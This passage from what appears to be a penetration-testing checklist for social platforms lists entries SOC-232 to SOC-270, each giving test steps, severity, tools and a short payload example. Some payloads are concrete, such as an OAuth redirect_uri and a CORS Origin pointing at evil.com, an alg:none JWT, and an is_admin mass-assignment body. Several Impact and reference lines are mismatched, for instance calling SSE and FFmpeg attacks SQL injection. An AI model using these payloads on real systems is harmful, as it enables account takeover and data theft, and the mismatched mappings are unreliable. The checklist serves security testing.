**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Use deprecated API version 2. Bypass new security measures 3. Exploit old vulnerabilities

**Expected Result:** Old API versions should be secured

**Payload Example:**

```
/api/v1/endpoint bypassing v2 security
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-233 — Rate Limit Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Hit rate limit 2. Bypass via headers 3. Continue abuse

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For or Origin rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SOC-234 — CORS Misconfiguration
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Send cross-origin request 2. Check CORS headers 3. Access data cross-origin

**Expected Result:** CORS should restrict origins

**Payload Example:**

```
Origin: https://evil.com with credentials
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## SOC-235 — Clickjacking on Social Actions
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Frame social action page 2. Overlay transparent UI 3. Trick user

**Expected Result:** Social actions should have X-Frame-Options

**Payload Example:**

```
Invisible iframe over follow button
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## SOC-236 — Content Security Policy Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Analyze CSP header 2. Find bypass techniques 3. Execute XSS despite CSP

**Expected Result:** CSP should be comprehensive

**Payload Example:**

```
Exploit unsafe-inline or weak sources
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** CSP Evaluator / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SOC-237 — JWT Token Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Capture JWT token 2. Modify claims 3. Access as different user

**Expected Result:** JWT should be properly validated

**Payload Example:**

```
{"alg":"none"} or modify user_id claim
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## SOC-238 — OAuth Redirect URI Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Initiate OAuth 2. Modify redirect_uri 3. Steal authorization code

**Expected Result:** Redirect URI should be strictly validated

**Payload Example:**

```
redirect_uri=https://evil.com/callback
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / OAuth Tools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## SOC-239 — Insecure Direct Object Reference Chain
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Access content 2. Access content's author 3. Access author's private data

**Expected Result:** All related objects should check auth

**Payload Example:**

```
Chained IDOR: post->author->private_info
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-240 — Mass Assignment Vulnerability
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Update profile 2. Add admin parameters 3. Escalate privileges

**Expected Result:** Input should be strictly validated

**Payload Example:**

```
{"bio":"test",is_admin:true,verified:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## SOC-241 — User Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Try various usernames 2. Compare responses 3. Enumerate valid users

**Expected Result:** Responses should be consistent

**Payload Example:**

```
Different errors for valid vs invalid users
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SOC-242 — Email Enumeration via Social
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Use forgot password 2. Check email existence 3. Enumerate emails

**Expected Result:** Responses should not reveal existence

**Payload Example:**

```
Different messages for registered emails
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SOC-243 — Phone Number Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Use phone-based features 2. Check number existence 3. Build user database

**Expected Result:** Phone checks should not leak info

**Payload Example:**

```
Find registered phone numbers
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / Custom Scripts

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SOC-244 — Timing Attack on Private Content
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Request private content 2. Measure response time 3. Determine existence

**Expected Result:** Response times should be consistent

**Payload Example:**

```
Timing difference for existing private content
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-245 — Cache-Based User Tracking
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Analyze caching behavior 2. Identify unique patterns 3. Track users across sessions

**Expected Result:** Caching should not enable tracking

**Payload Example:**

```
ETag or cached resource tracking
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-246 — Referrer Leakage
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Click external link from social 2. Check Referrer header 3. Leak private URLs

**Expected Result:** Referrer-Policy should be set

**Payload Example:**

```
Private content IDs in Referrer
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-247 — Social Engineering via Platform
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Create convincing fake profile 2. Impersonate trusted entity 3. Phish users

**Expected Result:** Verification should prevent impersonation

**Payload Example:**

```
Fake official-looking accounts
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SOC-248 — Data Export IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Request data export 2. Modify user_id 3. Download others' data

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/users/victim/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-249 — Account Recovery Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Initiate account recovery 2. Bypass verification 3. Take over account

**Expected Result:** Recovery should require proper verification

**Payload Example:**

```
Skip email/phone verification step
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SOC-250 — Two-Factor Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Enable 2FA 2. Find bypass mechanism 3. Login without 2FA

**Expected Result:** 2FA should be mandatory when enabled

**Payload Example:**

```
Bypass via backup codes or API
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SOC-251 — Backup Code Brute Force
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Find backup code entry 2. Brute force codes 3. Bypass 2FA

**Expected Result:** Backup code attempts should be limited

**Payload Example:**

```
Iterate through common backup codes
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SOC-252 — Session Concurrent Access
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Login from multiple devices 2. Check session handling 3. Find concurrent issues

**Expected Result:** Sessions should be properly isolated

**Payload Example:**

```
Race conditions in session state
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Turbo Intruder / Multiple Browsers

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SOC-253 — Notification Content Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Trigger notification with controlled content 2. Inject XSS 3. Execute on notification view

**Expected Result:** Notification content should be sanitized

**Payload Example:**

```
XSS in mention triggering notification
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-254 — Rich Media Metadata Exploitation
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Upload media 2. Check retained metadata 3. Extract sensitive info

**Expected Result:** Media should strip metadata

**Payload Example:**

```
EXIF GPS data in uploaded photos
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** ExifTool / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-255 — Deep Link Hijacking
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Analyze deep link scheme 2. Register malicious handler 3. Hijack links

**Expected Result:** Deep links should validate destination

**Payload Example:**

```
Malicious app handling social:// links
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Mobile Testing / Frida

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-256 — Content Delivery Network Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Find CDN URLs 2. Access directly 3. Bypass access controls

**Expected Result:** CDN should enforce same access controls

**Payload Example:**

```
Direct S3/CloudFront URL access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / AWS CLI

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-257 — Webhook Endpoint Abuse
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Find webhook configuration 2. Set to internal URL 3. SSRF via webhooks

**Expected Result:** Webhook URLs should be validated

**Payload Example:**

```
webhook=http://internal-service:8080
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SOC-258 — Server-Sent Events Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Connect to SSE endpoint 2. Analyze event format 3. Inject malicious events

**Expected Result:** SSE should validate event sources

**Payload Example:**

```
Inject events into SSE stream
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-259 — Push Notification Token Theft
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Capture push notification registration 2. Steal token 3. Send fake notifications

**Expected Result:** Push tokens should be protected

**Payload Example:**

```
Exposed FCM/APNs tokens
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Mobile Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-260 — Deferred Deep Link Exploitation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Create deferred deep link 2. Manipulate destination 3. Redirect after install

**Expected Result:** Deferred links should be validated

**Payload Example:**

```
Modify install attribution link
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Mobile Testing / Link Analysis

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-261 — Social Graph Inference Attack
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Analyze mutual connections 2. Infer private relationships 3. Build social graph

**Expected Result:** Social connections should be private if set

**Payload Example:**

```
Infer private follows from mutual data
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Custom Scripts / Graph Analysis

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-262 — Geolocation Privacy Leak
**Test Category:** Privacy Violation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Analyze location features 2. Find location exposure 3. Track user movements

**Expected Result:** Location should require explicit consent

**Payload Example:**

```
Location leaked via metadata or features
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-263 — Fingerprinting via Social Features
**Test Category:** Privacy Violation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Analyze unique feature usage 2. Fingerprint users 3. Track across sessions

**Expected Result:** Features should not enable fingerprinting

**Payload Example:**

```
Unique reaction patterns or timing
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Browser DevTools / Custom Scripts

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-264 — Third-Party Integration Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Connect third-party app 2. Analyze data shared 3. Find excessive sharing

**Expected Result:** Only necessary data should be shared

**Payload Example:**

```
Third-party accessing private content
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / OAuth Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-265 — Embed Code Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Generate embed code 2. Inject malicious code 3. XSS on embedding sites

**Expected Result:** Embed codes should be sanitized

**Payload Example:**

```
<iframe> with XSS in src
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-266 — Content Archive Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Find archive feature 2. Access archived content 3. Bypass current restrictions

**Expected Result:** Archives should respect current permissions

**Payload Example:**

```
Access deleted content via archive
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-267 — Scheduled Content Early Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Find scheduled content ID 2. Access before publish time 3. View unreleased content

**Expected Result:** Scheduled content should be time-locked

**Payload Example:**

```
GET /api/posts/scheduled_post_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-268 — Draft Content Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Find draft content endpoint 2. Access without authorization 3. View unpublished work

**Expected Result:** Drafts should be private

**Payload Example:**

```
GET /api/drafts/victim_draft_id
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SOC-269 — Media Transcoding Exploit
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Upload media 2. Exploit transcoding process 3. Achieve code execution

**Expected Result:** Transcoding should be sandboxed

**Payload Example:**

```
Malicious video exploiting FFmpeg
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / FFmpeg Exploit

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-270 — Image Processing SSRF
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Social Security

**Test Steps:** 1. Upload image with external reference 2. Trigger processing 3. SSRF

**Expected Result:** Image processing should not fetch external URLs

**Payload Example:**

```
SVG with external entity reference
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---
